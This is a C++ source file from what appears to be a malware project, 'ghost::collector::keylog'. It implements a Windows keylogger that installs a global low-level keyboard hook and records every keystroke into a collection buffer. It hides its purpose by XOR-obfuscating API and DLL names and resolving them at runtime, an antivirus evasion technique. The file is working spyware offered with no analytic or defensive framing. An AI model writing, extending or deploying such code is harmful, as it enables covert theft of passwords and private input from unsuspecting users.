#include "collector.h"
#include <windows.h>
#include <thread>
#include <string>

namespace ghost {
namespace collector {
namespace keylog {

namespace {
    template <size_t N>
    class ObfuscatedAString {
        char m_data[N];
        char m_key;
    public:
        constexpr ObfuscatedAString(const char (&str)[N], char key) : m_data{0}, m_key(key) {
            for (size_t i = 0; i < N; ++i) m_data[i] = str[i] ^ key;
        }
        std::string decrypt() const {
            std::string result(N - 1, '\0');
            for (size_t i = 0; i < N - 1; ++i) result[i] = m_data[i] ^ m_key;
            return result;
        }
    };
    #define OBF_A(str) ObfuscatedAString<sizeof(str)/sizeof(char)>(str, 'K').decrypt()

    template <size_t N>
    class ObfuscatedWString {
        wchar_t m_data[N];
        wchar_t m_key;
    public:
        constexpr ObfuscatedWString(const wchar_t (&str)[N], wchar_t key) : m_data{0}, m_key(key) {
            for (size_t i = 0; i < N; ++i) m_data[i] = str[i] ^ key;
        }
        std::wstring decrypt() const {
            std::wstring result(N - 1, L'\0');
            for (size_t i = 0; i < N - 1; ++i) result[i] = m_data[i] ^ m_key;
            return result;
        }
    };
    #define OBF_W(str) ObfuscatedWString<sizeof(str)/sizeof(wchar_t)>(str, L'K').decrypt()
}

typedef HHOOK(WINAPI* pSetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL(WINAPI* pUnhookWindowsHookEx)(HHOOK);
typedef LRESULT(WINAPI* pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);

static pSetWindowsHookExW   g_pSetWindowsHookExW   = nullptr;
static pUnhookWindowsHookEx g_pUnhookWindowsHookEx = nullptr;
static pCallNextHookEx      g_pCallNextHookEx      = nullptr;

bool ResolveUser32() {
    std::wstring user32Name = OBF_W(L"user32.dll");
    HMODULE hUser32 = LoadLibraryW(user32Name.c_str());
    if (!hUser32) return false;

    std::string setHookStr = OBF_A("SetWindowsHookExW");
    std::string unhookStr = OBF_A("UnhookWindowsHookEx");
    std::string callNextStr = OBF_A("CallNextHookEx");

    g_pSetWindowsHookExW   = (pSetWindowsHookExW)  GetProcAddress(hUser32, setHookStr.c_str());
    g_pUnhookWindowsHookEx = (pUnhookWindowsHookEx)GetProcAddress(hUser32, unhookStr.c_str());
    g_pCallNextHookEx      = (pCallNextHookEx)     GetProcAddress(hUser32, callNextStr.c_str());

    return g_pSetWindowsHookExW && g_pUnhookWindowsHookEx && g_pCallNextHookEx;
}

HHOOK g_hHook = nullptr;
std::thread g_HookThread; 
DWORD g_HookThreadId = 0; 

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        WCHAR unicodeChar[4] = {0};
        int result = ToUnicode(kb->vkCode, kb->scanCode, keyboardState, unicodeChar, 4, 0);

        if (result > 0) {
            uint8_t data[4] = {0};
            memcpy(data, &unicodeChar[0], sizeof(WCHAR)); 
            AppendToBuffer(data, 4);
        } else {
            uint8_t data[4] = { (uint8_t)kb->vkCode, 0, 0, 0 };
            AppendToBuffer(data, 4);
        }
    }
    
    return g_pCallNextHookEx ? g_pCallNextHookEx(g_hHook, nCode, wParam, lParam) : 0;
}

void RunMessageLoop() {
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

bool InstallHook() {
    if (g_hHook != nullptr) return true; 
    
    if (!ResolveUser32()) return false;
    
    g_HookThread = std::thread([]() {
        g_HookThreadId = GetCurrentThreadId(); 
        
        g_hHook = g_pSetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(nullptr), 0);
        
        if (g_hHook) {
            RunMessageLoop(); 
        }
    });
    
    return true;
}

void UninstallHook() {
    if (g_hHook && g_pUnhookWindowsHookEx) {
        g_pUnhookWindowsHookEx(g_hHook);
        g_hHook = nullptr;
    }
    
    if (g_HookThreadId != 0) {
        PostThreadMessage(g_HookThreadId, WM_QUIT, 0, 0);
    }
    
    if (g_HookThread.joinable()) {
        g_HookThread.join();
    }
}

} 
} 
}